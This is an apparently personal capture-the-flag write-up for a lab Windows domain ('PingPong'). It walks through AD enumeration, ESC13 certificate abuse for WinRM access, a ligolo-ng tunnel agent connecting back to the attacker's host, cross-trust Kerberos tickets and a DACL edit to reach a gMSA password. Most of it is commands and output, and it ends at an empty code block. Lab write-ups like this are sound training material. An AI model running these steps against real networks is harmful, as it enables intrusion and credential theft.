# Machine info
As is common in real life pentests, you will start the PingPong box with credentials for the following account c.roberts / AssumedBreach123

```python
c.roberts:AssumedBreach123
```

# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.245.56 --generate-hosts-file /etc/hosts    

SMB         10.129.245.56   445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

Since NTLM is disabled ill also generate a realm 

# System time
```python
❯❯❯ ntpdate dc1.ping.htb  
2026-11-22 02:29:19.158508 (+0000) +28799.610798 +/- 0.006356 dc1.ping.htb 10.129.245.56 s1 no-leap
CLOCK: step_systime: Operation not permitted
```

Its running at +8h

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc1.ping.htb -vv

Nmap scan report for dc1.ping.htb (10.129.245.56)
Host is up, received user-set (0.012s latency).
Scanned at 2026-11-21 18:30:13 GMT for 65s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
2179/tcp  open  vmrdp            syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
51795/tcp open  unknown          syn-ack
64770/tcp open  unknown          syn-ack
64920/tcp open  unknown          syn-ack
64924/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 65.69 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc1.ping.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-21 18:33 +0000
Nmap scan report for dc1.ping.htb (10.129.245.56)
Host is up (0.013s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-22 02:33:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

2179 kinda tells me there is going to be some form of virtualisation, most likely an internal network

# SMB (445)

```python
❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k
SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:AssumedBreach123
```

The creds work on the domain!

```python
❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k --users
SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:AssumedBreach123 
SMB         dc1.ping.htb    445    dc1              -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc1.ping.htb    445    dc1              Administrator                 2026-02-03 09:42:36 0       Built-in account for administering the computer/domain 
SMB         dc1.ping.htb    445    dc1              Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc1.ping.htb    445    dc1              krbtgt                        2025-06-16 11:36:47 0       Key Distribution Center Service Account 
SMB         dc1.ping.htb    445    dc1              M.Russell                     2025-12-28 08:14:51 0       IT manager 
SMB         dc1.ping.htb    445    dc1              G.Lorents                     2025-12-28 08:14:51 0       IT Support Specialist 
SMB         dc1.ping.htb    445    dc1              Z.Iskam                       2025-12-28 08:14:51 0       IT Director 
SMB         dc1.ping.htb    445    dc1              M.Wallace                     2025-12-28 08:14:51 0       Assurance Tester 
SMB         dc1.ping.htb    445    dc1              P.Paul                        2025-12-28 08:14:52 0       Security Specialist 
SMB         dc1.ping.htb    445    dc1              A.Gordon                      2025-12-28 08:14:52 0       Network Engineer 
SMB         dc1.ping.htb    445    dc1              P.Klain                       2025-12-28 08:14:52 0       Senior IT Technician 
SMB         dc1.ping.htb    445    dc1              C.Roberts                     2025-12-28 08:14:52 0       Junior IT Technician 
SMB         dc1.ping.htb    445    dc1              S.Zhoski                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              R.Miller                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              A.Adam                        2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              R.Robins                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              P.Pollek                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              O.Plinski                     2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              V.Vodomir                     2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              D.MacKenzie                   2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              P.Vandeval                    2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              T.Yang                        2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              N.Neri                        2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              W.Williams                    2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              K.Podroski                    2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              G.James                       2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              [*] Enumerated 25 local users: PING
```

Ill get the users and the user account descriptions

```python
❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC1$
pong$
M.Russell
G.Lorents
Z.Iskam
M.Wallace
P.Paul
A.Gordon
P.Klain
C.Roberts
gMSA$
S.Zhoski
R.Miller
A.Adam
R.Robins
P.Pollek
O.Plinski
V.Vodomir
D.MacKenzie
P.Vandeval
T.Yang
N.Neri
W.Williams
K.Podroski
G.James
```

Ill use the rid brute flag since this also pulls machine accounts to get a user file

I also only have read on default shares

# Bloodhound collection

```python
❯❯❯ bloodyAD --host dc1.ping.htb -d ping.htb -k get bloodhound --transitive                  
Clock skew detected. Adjusting local time by 7:59:58.951478. Retrying operation.
[+] Connecting to LDAP server
Clock skew detected. Adjusting local time by 7:59:58.812825. Retrying operation.
[+] Connected to LDAP serrver
Dumping schema: 2it [00:00, 26.81it/s]
Generating lookuptable: 105it [00:00, 548.40it/s]
Dumping SDs:  99%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▍ | 110/111 [00:01<00:00, 61.98it/s]
Dumping domains: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 21.15it/s]
Dumping users: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 25/25 [00:00<00:00, 650.14it/s]
Dumping computers: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 93.06it/s]
Dumping groups: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 53/53 [00:00<00:00, 1183.26it/s]
Dumping GPOs: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3/3 [00:00<00:00, 168.87it/s]
Dumping OUs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 66.65it/s]
Dumping Containers: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 353.97it/s]
[+] Bloodhound data saved to 20261121T184834_Bloodhound.zip
[+] Found 1 trusts
[+] Found trust pong.htb (S-1-5-21-2410575906-3092493790-2123333151)
[+] Connecting to pong.htb (follow_trusts)
[-] Failed to connect to pong.htb ([Errno -2] Name or service not known)
[-] If it's a connectivity issue (not auth issue), make sure the hostname resolves to an IP address (eg. modify your /etc/hosts)
```

From this output i can see bloodyAD detects a trust, but since the machine is likely internal i cannot reach it as of yet

![](Pasted%20image%2020261121190039.png)

And after ingesting this i see there is a trust between the two domains

# ADCS (ESC13) leads to access over WINRM

```python
❯❯❯ faketime -f +8h certipy-ad find -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 10.129.245.56 -u c.roberts -p 'AssumedBreach123' -k -enabled -stdout -vulnerable

Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
    Active Policy                       : Unknown
    Disabled Extensions                 : Unknown
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

Looks like i can grant winrm access through ESC13

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked

```python
❯❯❯ faketime -f +8h certipy-ad req -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 10.129.245.56 -u c.roberts -p 'AssumedBreach123' -k -ca 'ping-DC1-CA' -template 'TemporaryWinRM'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Saving certificate and private key to 'c.roberts.pfx'
[*] Wrote certificate and private key to 'c.roberts.pfx'
```

Ill first just make the request specifying the CA and the template

```python
❯❯❯ faketime -f +8h certipy-ad auth -pfx c.roberts.pfx -dc-ip 10.129.245.56
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```

Then ill auth with it, i now have a TGT that contains the authentication info to connect over WINRM

```python
❯❯❯ export KRB5CCNAME=c.roberts.ccache

❯❯❯ faketime -f +8h evil-winrm -i dc1.ping.htb -r ping.htb
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> 
```

Then after exporting ill just specify the host and the realm, which has already been setup at the start

# Pivoting with ligolo-ng

```python
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> ping pong.htb

Pinging pong.htb [192.168.2.2] with 32 bytes of data:
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128

Ping statistics for 192.168.2.2:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
*Evil-WinRM* PS C:\Users\C.Roberts\Documents
```

As seen here there is an internal network which is the `pong.htb` domain

```python
evil-winrm-py PS C:\ProgramData> upload agent.exe .
Uploading /home/kali/htb/pingpong/agent.exe: 7.06MB [00:14, 521kB/s]                                                                                                                                                               
[+] File uploaded successfully as: C:\ProgramData\agent.exe
```

First ill upload the agent

```python
❯❯❯ sudo ./proxy -selfcert                                    
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.2

ligolo-ng »
```

Then ill start the proxy on my system

```python
evil-winrm-py PS C:\ProgramData> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
```

Ill then send the connection back to my machine

```python
ligolo-ng » INFO[0207] Agent joined.                                 id=00155d168601 name="PING\\C.Roberts@dc1" remote="10.129.245.56:55877"
ligolo-ng » 
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - PING\C.Roberts@dc1 - 10.129.245.56:55877 - 00155d168601
[Agent : PING\C.Roberts@dc1] » 

[Agent : PING\C.Roberts@dc1] » ifcreate --name ligolo
INFO[0221] Creating a new ligolo interface...           
INFO[0221] Interface created!

[Agent : PING\C.Roberts@dc1] » route_add --name ligolo --route 192.168.2.0/24
INFO[0259] Route created.                               
[Agent : PING\C.Roberts@dc1] » start
INFO[0263] Starting tunnel to PING\C.Roberts@dc1 (00155d168601) 
[Agent : PING\C.Roberts@dc1] » 
```

So first ill select the session then add an interface for this connection, then ill add the routing info found earlier and then start the tunnel

```python
❯❯❯ nxc smb 192.168.2.0/24                                                 
SMB         192.168.2.1     445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         192.168.2.2     445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:None) (NTLM:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

As seen here there is two hosts, two domain controllers

DC1 is the only i can reach from my machine, so my focus for now will be on `.2.2`

Another things to note, looks like NTLM is disabled in both domains

```python
❯❯❯ sudo nxc smb 192.168.2.2 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         192.168.2.2     445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

Ill also create an entry in my hosts file for dc2

# Trust enumeration

```python
❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --dc-list     
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              DC2.pong.htb = 192.168.2.2
LDAP        dc2.pong.htb    389    DC2              [+] Found DC in trusted domain: dc1.ping.htb
LDAP        dc2.pong.htb    389    DC2              ping.htb -> Bidirectional -> Forest Transitive
LDAP        dc2.pong.htb    389    DC2              dc1.ping.htb = 192.168.2.1
```

I can use nxc to get the details on the trust, this is clearly a two way trust

```python
❯❯❯ cat /etc/krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = PING.HTB
    dns_canonicalize_hostname = false
    rdns = false

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
        admin_server = dc1.ping.htb
        default_domain = ping.htb
    }
    PONG.HTB = {
        kdc = dc2.pong.htb
        admin_server = dc2.pong.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb = PONG.HTB
```

In order to auth, ill update the `krb5.conf` for both domains

```python
❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --gmsa
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: gMSA Managers
```

After seeing an interesting user with a user profile on dc1 `Pong_gMSA$` it gave me the idea to check gmsa and i see this group has the permission to read this

```python
❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --groups
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              -Group-                                  -Members- -Description-

...[SNIP]...

LDAP        dc2.pong.htb    389    DC2              gMSA Managers                            0 
```

Looks like there is no members in this group currently

# Writable objects in `pong.htb` as `c.roberts`

```python
❯❯❯ export KRB5CCNAME=c.roberts.ccache

❯❯❯ faketime -f +8h getST.py -k -no-pass -dc-ip 192.168.2.1 'ping.htb/c.roberts' -spn 'krbtgt/PONG.HTB'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache

❯❯❯ export KRB5CCNAME=c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache

❯❯❯ faketime -f +8h getST.py -k -no-pass -dc-ip 192.168.2.2 'pong.htb/c.roberts' -spn 'ldap/dc2.pong.htb'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache
```

Now i have setup a ticket i can auth to the other domain with

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d ping.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=gMSA Managers,CN=Users,DC=pong,DC=htb
DACL: WRITE

distinguishedName: DC=pong.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.pong.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD
```

I can now check writable objects as this user `c.roberts`

And as seen here i see that i have WriteDACL on this, which means i can give `c.roberts` genericAll then add them to the group in order to read the gmsa password of `Pong_gMSA$`

# Adding `c.roberts` to `gMSA Managers`

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

Ill get the SID of `c.roberts` from bloodhound then add genericAll

```python

```

